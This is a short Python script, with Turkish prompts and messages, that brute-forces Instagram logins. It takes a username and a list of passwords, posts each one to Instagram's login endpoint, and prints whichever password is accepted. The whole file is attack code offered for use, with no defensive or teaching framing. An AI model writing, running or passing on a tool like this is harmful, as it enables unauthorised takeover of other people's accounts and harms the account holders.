import requests

def brute_force(username, password_list):
    for password in password_list:
        response = requests.post("https://www.instagram.com/accounts/login/ajax/", data={"username": username, "password": password})
        if response.json().get("authenticated"):
            print(f"Başarılı! Şifre: {password}")
            break
        else:
            print(f"Hatalı şifre: {password}")

username = input("Instagram kullanıcı adını girin: ")
password_list = input("Denemek istediğiniz şifreleri virgülle ayırarak girin: ").split(",")

brute_force(username, password_list)